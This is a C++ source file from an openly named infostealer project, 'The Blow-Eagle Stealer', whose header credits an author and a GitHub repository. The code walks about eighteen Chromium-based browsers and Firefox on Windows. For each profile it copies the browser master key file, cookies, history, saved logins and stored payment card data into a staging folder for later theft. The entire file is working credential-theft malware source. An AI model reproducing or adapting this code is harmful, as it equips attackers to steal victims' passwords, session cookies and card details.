/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.cpp"
#include "../../helper/helper.h"
#include <fstream>
#include <vector>

namespace global 
{
    std::string user = func::GetUser();
    std::string appdata = "C:/Users/" + user + "/AppData/Local";
    std::string roaming = "C:/Users/" + user + "/AppData/Roaming";
    std::string defaultPath = "C:/Users/" + user + config::path + "/Browsers";

    std::string names[] = {
        "/Amigo",
        "/Torch",
        "/Kometa",
        "/Orbitum",
        "/CentBrowser",
        "/7Star",
        "/Sputnik",
        "/Vivaldi",
        "/Chrome SxS",
        "/Chrome",
        "/Epic Privacy Browser",
        "/Edge",
        "/Uran",
        "/YandexBrowser",
        "/Brave-Browser",
        "/Iridium",
        "/Opera GX",
        "/Opera"
    };
}

void GetCookies(std::string path , std::string profile, int counter);

void GetHistory(std::string path, std::string profile, int counter);

void GetLogins(std::string path, std::string profile, int counter);

void GetCards(std::string path, std::string profile, int counter);

void CopyMasterKey(std::string path, int counter);

void browsers::Chromium()
{
    printf("Chromium\n");


    std::string browsersPaths[] = 
    {
         global::appdata+"/Amigo/User Data",
         global::appdata + "/Torch/User Data",
         global::appdata + "/Kometa/User Data",
         global::appdata + "/Orbitum/User Data",
         global::appdata + "/CentBrowser/User Data",
         global::appdata + "/7Star/7Star/User Data",
         global::appdata + "/Sputnik/Sputnik/User Data",
         global::appdata + "Vivaldi/User Data",
         global::appdata + "/Google/Chrome SxS/User Data",
         global::appdata + "/Google/Chrome/User Data",
         global::appdata + "/Epic Privacy Browser/User Data",
         global::appdata + "/Microsoft/Edge/User Data",
         global::appdata + "/uCozMedia/Uran/User Data",
         global::appdata + "/Yandex/YandexBrowser/User Data",
         global::appdata + "/BraveSoftware/Brave-Browser/User Data",
         global::appdata + "/Iridium/User Data",
         global::roaming + "/Opera Software/Opera GX Stable",
         global::roaming + "/Opera Software/Opera Stable"
    };

    std::string profiles[] = { 
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5",
        "Guest Profile"
    };

    int result = _mkdir(global::defaultPath.c_str());

    for (size_t i = 0; i < std::size(browsersPaths); i++)
    {
        if (std::filesystem::exists(browsersPaths[i])) 
        {
            for (size_t j = 0; j < std::size(profiles); j++)
            {
                if (std::filesystem::exists(browsersPaths[i] + "/" + profiles[j]))
                {
                    std::string dir = global::defaultPath + global::names[i];
                    int result = _mkdir(dir.c_str());

                    CopyMasterKey(browsersPaths[i], i);
                    GetCookies (browsersPaths[i], profiles[j], i);
                    GetHistory(browsersPaths[i], profiles[j], i);
                    GetLogins(browsersPaths[i], profiles[j], i);
                    GetCards(browsersPaths[i], profiles[j], i);
                }
            }
        }
    }
}

void browsers::FireFox()
{
    std::string path = global::roaming + "/Mozilla/Firefox/Profiles";
    std::string defPaths = global::defaultPath + "/Firefox";
    int result = _mkdir(global::defaultPath.c_str());

    if (std::filesystem::exists(path))
    {
        int result = _mkdir(defPaths.c_str());

        func::copyDirectory(path, defPaths);

    }
}


void CopyMasterKey(std::string path, int counter)
{
    path += "/Local State";

    func::copyFile(path, global::defaultPath + global::names[counter]);
}


void GetCookies(std::string path, std::string profile, int counter)
{
    // Path to Chrome's cookies database
    std::string cookiesDbPath = path + "/" + profile+ "/Network/Cookies";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter]+ "/Cookies_" + profile);
}

void GetHistory(std::string path, std::string profile, int counter)
{
    std::string cookiesDbPath = path + "/" + profile + "/History";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/History_" + profile);
}

void GetLogins(std::string path, std::string profile, int counter)
{
    std::string cookiesDbPath = path + "/" + profile + "/Login Data";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/Login Data_" + profile);
}

void GetCards(std::string path, std::string profile, int counter)
{
    std::string cookiesDbPath = path + "/" + profile + "/Web Data";

    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter] + "/Web Data_" + profile);
}


